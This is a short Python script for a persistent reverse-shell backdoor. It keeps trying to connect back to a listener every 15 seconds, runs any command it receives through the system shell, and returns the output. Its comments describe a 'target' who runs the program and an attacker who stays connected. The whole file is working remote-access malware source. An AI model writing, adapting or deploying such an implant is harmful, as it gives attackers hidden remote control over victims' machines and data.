
import socket
import subprocess
import json
import time

def Connection(): # The purpose of this function is to keep our connection persistent either the target end our task  
	while True:   # or if the target click on the program 3 hours before and we connect after 3 hour later even then 
		time.sleep(15) # we will be able to connect with the target because of with the help of this function, it 
		               # will keep connecting us with the target after every 15 seconds. 
		try:          
			sock.connect(("127.0.0.1",54321))
			print("Connection to Server Established")
			Shell()

		except:
			Connection()



def reliable_send(data) :
	json_data=json.dumps(data)
	sock.send(json_data)

def reliable_recv() :
	json_data=""
	while True:
		try:
			json_data=json_data + sock.recv(1024)
			return json.loads(json_data)
		except ValueError :
			continue


def Shell() :
	while True:
		command=reliable_recv()
		if command=="q":
			break
		else:
			try:
				proc=subprocess.Popen(command ,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result=proc.stdout.read() + proc.stderr.read()
				reliable_send(result)
			except:
				reliable_send("[!!] Can't Execute That Command")


sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Connection()
sock.close()
